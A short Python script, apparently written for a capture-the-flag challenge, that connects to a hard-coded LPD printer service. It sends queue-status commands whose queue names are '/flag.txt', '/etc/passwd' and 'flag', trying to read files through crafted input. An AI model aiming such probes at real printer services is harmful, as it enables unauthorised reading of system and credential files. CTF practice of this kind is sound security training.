#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def send_lpd_command(cmd, queue="lp"):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        
        # Enviar comando
        data = bytes([cmd]) + queue.encode() + b'\n'
        s.sendall(data)
        
        # Leer respuesta completa
        response = b''
        s.settimeout(2)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        
        s.close()
        return response
    except Exception as e:
        return f"Error: {e}".encode()

print("=== Test comando 0x04 con cola 'lp' ===")
resp = send_lpd_command(0x04, "lp")
print(f"Len: {len(resp)}, Data: {resp}")
print(resp.hex())
print()

print("=== Test comando 0x04 con cola '/flag.txt' ===")
resp = send_lpd_command(0x04, "/flag.txt")
print(f"Len: {len(resp)}, Data: {resp}")
print(resp.hex())
print()

print("=== Test comando 0x03 con cola '/etc/passwd' ===")
resp = send_lpd_command(0x03, "/etc/passwd")
print(f"Len: {len(resp)}, Data: {resp}")
print(resp.hex())
print()

print("=== Test comando 0x04 con cola 'flag' ===")
resp = send_lpd_command(0x04, "flag")
print(f"Len: {len(resp)}, Data: {resp}")
print(resp.hex())